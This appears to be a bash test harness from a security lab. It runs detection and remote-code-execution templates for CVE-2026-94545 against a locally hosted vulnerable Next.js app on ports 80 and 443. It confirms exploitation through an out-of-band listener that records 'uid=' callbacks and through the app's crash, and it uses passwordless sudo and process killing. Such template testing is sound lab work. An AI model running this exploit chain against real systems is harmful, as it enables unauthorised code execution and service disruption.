#!/usr/bin/env bash
# Prove that the templates work against targets on the standard ports: plain
# HTTP on :80 and HTTPS on :443.
#
#   :80   vulnerable app served directly by next (root, privileged port)
#   :443  tls-proxy.py terminating TLS in front of a second instance on :8080
#         with a self-signed certificate - exactly how a real https:// target
#         looks, and the reason nuclei's transport skips certificate checks
#         (pkg/protocols/http/httpclientpool/clientpool.go sets
#         InsecureSkipVerify: true; the shim mirrors that, --tls-verify restores
#         verification).
#
# Both hosts are exploited for real, so both app instances die - that is the
# success criterion, not an accident.
#
# Usage: ./test-standard-ports.sh [--oob-port 4444] [--keep]
# Needs passwordless sudo for the two privileged binds.
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHIM="$LAB_DIR/tools/nuclei-shim.mjs"
DETECT="$LAB_DIR/../CVE-2026-94545.yaml"
RCE="$LAB_DIR/../CVE-2026-94545-rce.yaml"
APP_DIR="$LAB_DIR/run/vulnerable"
NODE_BIN="$LAB_DIR/.runtime/node/bin/node"
OOB_LOG="$LAB_DIR/oob-standard-ports.log"
HTTP_PORT=80
TLS_PORT=443
BACKEND_PORT=8080
OOB_PORT=4452
KEEP=0

while [ $# -gt 0 ]; do
  case "$1" in
    --oob-port) OOB_PORT="${2:?}"; shift 2 ;;
    --keep)     KEEP=1; shift ;;
    -h|--help)  sed -n '2,20p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

PASS=0; FAIL=0
c_green=$'\033[1;32m'; c_red=$'\033[1;31m'; c_dim=$'\033[2m'; c_blue=$'\033[1;34m'; c_off=$'\033[0m'
section() { printf '\n%s=== %s ===%s\n' "$c_blue" "$*" "$c_off"; }
info()    { printf '%s    %s%s\n' "$c_dim" "$*" "$c_off"; }
ok()      { printf '  %sPASS%s %s\n' "$c_green" "$c_off" "$1"; PASS=$((PASS + 1)); }
bad()     { printf '  %sFAIL%s %s\n' "$c_red" "$c_off" "$1"; FAIL=$((FAIL + 1)); }

mkdir -p "$LAB_DIR/logs"
: > "$OOB_LOG"

[ -x "$NODE_BIN" ] || { echo "no node in .runtime - run ./setup.sh first" >&2; exit 1; }
[ -d "$APP_DIR/.next" ] || { echo "no built vulnerable app - run ./setup.sh first" >&2; exit 1; }
if ! sudo -n true 2>/dev/null; then
  echo "passwordless sudo is required to bind :80 and :443 - skipping" >&2
  exit 1
fi

# --------------------------------------------------------------- helper funcs
port_free() { [ -z "$(ss -ltnH "sport = :$1" 2>/dev/null | grep -E "(127\.0\.0\.1|0\.0\.0\.0|\*):$1")" ]; }

kill_port() { # kill whatever listens on $1, escalating to sudo for root-owned pids
  local port=$1 pid pids
  pids="$(ss -ltnpH "sport = :$port" 2>/dev/null | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u)"
  [ -z "$pids" ] && pids="$(sudo -n ss -ltnpH "sport = :$port" 2>/dev/null | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u)"
  for pid in $pids; do
    kill "$pid" 2>/dev/null || sudo -n kill "$pid" 2>/dev/null || true
  done
}

start_app_root() { # $1 = port
  sudo -n bash -c "cd '$APP_DIR' && NEXT_TELEMETRY_DISABLED=1 PATH='$(dirname "$NODE_BIN"):$PATH' \
    nohup setsid --fork '$NODE_BIN' ./node_modules/next/dist/bin/next start -H 0.0.0.0 -p $1 \
    >'$LAB_DIR/logs/standard-ports-$1.log' 2>&1 </dev/null &"
  disown -a 2>/dev/null || true
}

wait_http() { # $1 = url, $2 = seconds
  local deadline=$(( $(date +%s) + ${2:-30} ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    curl -fsSk -m 3 -o /dev/null "$1" 2>/dev/null && return 0
    sleep 0.5
  done
  return 1
}

shim() { node "$SHIM" "$@" --quiet; }

cleanup() {
  kill_port "$HTTP_PORT"
  kill_port "$TLS_PORT"
  kill_port "$BACKEND_PORT"
  kill_port "$OOB_PORT"   # only ever our own listener on this port
  return 0
}
trap cleanup EXIT

# ------------------------------------------------------------------- preflight
section "preflight"
for p in "$HTTP_PORT" "$TLS_PORT" "$BACKEND_PORT"; do
  if port_free "$p"; then
    info "port $p free"
  else
    echo "port $p is already in use" >&2
    exit 1
  fi
done
# the listener must be ours: the shim counts *new* lines in exactly this file, and a
# listener started by ./start.sh writes to its own log
if port_free "$OOB_PORT"; then
  nohup setsid --fork python3 "$LAB_DIR/oob-listener.py" --host 0.0.0.0 --port "$OOB_PORT" --log "$OOB_LOG" \
    >"$LAB_DIR/logs/standard-ports-oob.log" 2>&1 </dev/null &
  disown -a 2>/dev/null || true
  info "started an OOB listener on :$OOB_PORT (log: $(basename "$OOB_LOG"))"
  sleep 0.5
else
  echo "port $OOB_PORT is already in use - pass --oob-port with a free one" >&2
  exit 1
fi

# ------------------------------------------------------------- plain HTTP :80
section "http://127.0.0.1:$HTTP_PORT (the default HTTP port)"
start_app_root "$HTTP_PORT"
if wait_http "http://127.0.0.1:$HTTP_PORT/api/og?value=ready"; then
  ok "vulnerable app answers on :$HTTP_PORT"
else
  bad "vulnerable app did not come up on :$HTTP_PORT"
fi

if shim "$DETECT" "127.0.0.1:$HTTP_PORT" --print-response >"$LAB_DIR/logs/standard-ports-detect-80.log" 2>&1; then
  ok "detection matches the plain-HTTP target on :$HTTP_PORT"
else
  bad "detection did not match on :$HTTP_PORT"
  sed 's/^/    /' "$LAB_DIR/logs/standard-ports-detect-80.log" | tail -3
fi

if shim "$RCE" "127.0.0.1:$HTTP_PORT" --var "oast=127.0.0.1:$OOB_PORT" --oob-log "$OOB_LOG" \
     >"$LAB_DIR/logs/standard-ports-rce-80.log" 2>&1; then
  ok "exploit matched on :$HTTP_PORT"
else
  bad "exploit did not match on :$HTTP_PORT"
fi
sleep 1
if grep -q 'uid=' "$OOB_LOG"; then
  ok "callback from the :$HTTP_PORT chain" "$(sed 's/.*data=//' "$OOB_LOG" | grep -m1 'uid=')"
else
  bad "no callback recorded from the :$HTTP_PORT chain"
fi
port_free "$HTTP_PORT" && ok "the :$HTTP_PORT worker was replaced" || bad "app on :$HTTP_PORT survived"

# -------------------------------------------------------------- HTTPS :443
section "https://127.0.0.1:$TLS_PORT (TLS in front of :$BACKEND_PORT)"
CERT_DIR="$(mktemp -d)"
openssl req -x509 -newkey rsa:2048 -nodes -keyout "$CERT_DIR/key.pem" -out "$CERT_DIR/cert.pem" \
  -days 2 -subj "/CN=127.0.0.1" -addext "subjectAltName=IP:127.0.0.1" >/dev/null 2>&1
[ -s "$CERT_DIR/cert.pem" ] && info "self-signed certificate for 127.0.0.1 generated" || bad "openssl could not create a certificate"

start_app_root "$BACKEND_PORT"
if wait_http "http://127.0.0.1:$BACKEND_PORT/api/og?value=ready"; then
  info "backend app up on :$BACKEND_PORT"
else
  bad "backend app did not come up on :$BACKEND_PORT"
fi

sudo -n bash -c "nohup setsid --fork python3 '$LAB_DIR/tls-proxy.py' --port $TLS_PORT \
  --backend 127.0.0.1:$BACKEND_PORT --cert '$CERT_DIR/cert.pem' --key '$CERT_DIR/key.pem' \
  >'$LAB_DIR/logs/standard-ports-tls.log' 2>&1 </dev/null &"
disown -a 2>/dev/null || true
if wait_http "https://127.0.0.1:$TLS_PORT/api/og?value=ready"; then
  ok "TLS front end serves https://127.0.0.1:$TLS_PORT"
else
  bad "TLS front end did not come up on :$TLS_PORT"
  sed 's/^/    /' "$LAB_DIR/logs/standard-ports-tls.log" | tail -3
fi

if shim "$DETECT" "https://127.0.0.1:$TLS_PORT" --print-response >"$LAB_DIR/logs/standard-ports-detect-443.log" 2>&1; then
  ok "detection matches the https:// target on :$TLS_PORT"
else
  bad "detection did not match on :$TLS_PORT"
  sed 's/^/    /' "$LAB_DIR/logs/standard-ports-detect-443.log" | tail -3
fi

# what real scans look like: no explicit port, and a bare host that must fall back to https
if shim "$DETECT" "https://127.0.0.1" --print-response >"$LAB_DIR/logs/standard-ports-detect-implicit.log" 2>&1; then
  ok 'detection matches "https://127.0.0.1" without a port (implicit 443)'
else
  bad 'detection did not match the implicit-443 form'
fi
if shim "$DETECT" "127.0.0.1" --print-response >"$LAB_DIR/logs/standard-ports-detect-bare.log" 2>&1; then
  ok 'detection falls back to https for a bare host "127.0.0.1"'
else
  bad 'detection did not match the bare-host form'
fi

if shim "$DETECT" "https://127.0.0.1:$TLS_PORT" --tls-verify >/dev/null 2>&1; then
  bad "--tls-verify still matched a self-signed target (expected a certificate error)"
else
  ok "--tls-verify rejects the self-signed certificate, as it should"
fi

before="$(grep -c . "$OOB_LOG" 2>/dev/null || true)"
if shim "$RCE" "https://127.0.0.1:$TLS_PORT" --var "oast=127.0.0.1:$OOB_PORT" --oob-log "$OOB_LOG" \
     >"$LAB_DIR/logs/standard-ports-rce-443.log" 2>&1; then
  ok "exploit matched on :$TLS_PORT (payload delivered through TLS)"
else
  bad "exploit did not match on :$TLS_PORT"
fi
sleep 1
if [ "$(grep -c . "$OOB_LOG" 2>/dev/null || true)" -gt "${before:-0}" ]; then
  ok "callback from the :$TLS_PORT chain" "$(sed 's/.*data=//' "$OOB_LOG" | tail -1)"
else
  bad "no callback recorded from the :$TLS_PORT chain"
fi
port_free "$BACKEND_PORT" && ok "the backend behind :$TLS_PORT was replaced" || bad "backend behind :$TLS_PORT survived"

[ "$KEEP" = "1" ] || rm -rf "$CERT_DIR"

section "summary"
printf '  %s\n' "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
